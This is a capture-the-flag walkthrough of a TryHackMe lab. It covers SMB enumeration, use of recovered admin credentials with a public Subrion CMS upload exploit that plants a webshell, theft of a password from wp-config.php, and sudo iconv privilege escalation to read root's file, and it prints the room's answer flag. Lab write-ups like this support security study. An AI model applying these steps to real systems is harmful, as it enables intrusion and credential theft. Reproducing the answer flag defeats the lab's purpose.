# Tech Support Walkthrough
### Link
- https://tryhackme.com/room/techsupp0rt1
---
### Recon

```
nmap -sC -sV [IP]
```
**Namp scan result**
```
Nmap scan report for 10.10.36.71
Host is up (0.38s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-11-02T08:25:04+05:30
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-11-02T02:55:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.57 seconds
```

Many interesting findings: 
```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
```
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```
---
### Test samba connection

```
smbclient -L //[IP]
```
Use **anonymous** as password

```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Now, we can try to connect with **websvr**
```
smbclient -N //10.10.224.168/websvr
Try "help" to get a list of possible commands.
smb: \>
```

Now we can check the content
```
smb: \> ls
  .                                   D        0  Sat May 29 16:17:38 2021
  ..                                  D        0  Sat May 29 16:03:47 2021
  enter.txt                           N      273  Sat May 29 16:17:38 2021

		8460484 blocks of size 1024. 5673640 blocks available
```
Let's download this file **enter.txt**
```
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```
---
### enter.txt file 
```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```
We have the encrypted admin password ^^

---
### Admin password

We can use [CyberChef](https://gchq.github.io/CyberChef) and we found this password : **Scam2021**

---
### Portal

From the **enter.txt**, we also know the path to the site : **/subrion/panel** so let's go here and use **admin:Scam2021** to log in.

---
### Exploit

The key information is the framework version : **Subrion CMS 4.2.1**

Now we can try to find an exploit here : [exploitdb](https://www.exploit-db.com/exploits/49876)

Download it and let's try !!!!

```
python3 49876.py -u http://10.10.152.255/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.152.255/subrion/panel/
[+] Success!
[+] Got CSRF token: PpJn8yt23KjBNpCMkbm3PzakXPJoaNVNAfhU181K
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: vdntvkgkvjqqart

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.152.255/subrion/panel/uploads/vdntvkgkvjqqart.phar 

$ ls
vdntvkgkvjqqart.phar

```
---
### Privilege escalation

I found a password in the wp-config.php

```
cat /var/www/html/wordpress/wp-config.php
....
/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

```
We have a password. We need to find the user attached to this password and for that, we can check **/etc/passwd**
```
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```

Let's connect to the server through SSH
```
ssh scamsite@10.10.152.255
The authenticity of host '10.10.152.255 (10.10.152.255)' can't be established.
ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.152.255' (ED25519) to the list of known hosts.
scamsite@10.10.152.255's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Fri May 28 23:30:20 2021
scamsite@TechSupport:~$ 

```

Now, we can use the command **sudo -l** to check what **scamsite** can run
```
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
```
(ALL) NOPASSWD: /usr/bin/iconv
```

Let's go to [Gtfobins](https://gtfobins.github.io/gtfobins/iconv/#sudo) and execute the pattern
```
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
851b8233a8c09400ec30651bd1529bf1ed02790b 
```

**Question**
#### What is the root.txt flag?
**Answer** 
#### 851b8233a8c09400ec30651bd1529bf1ed02790b

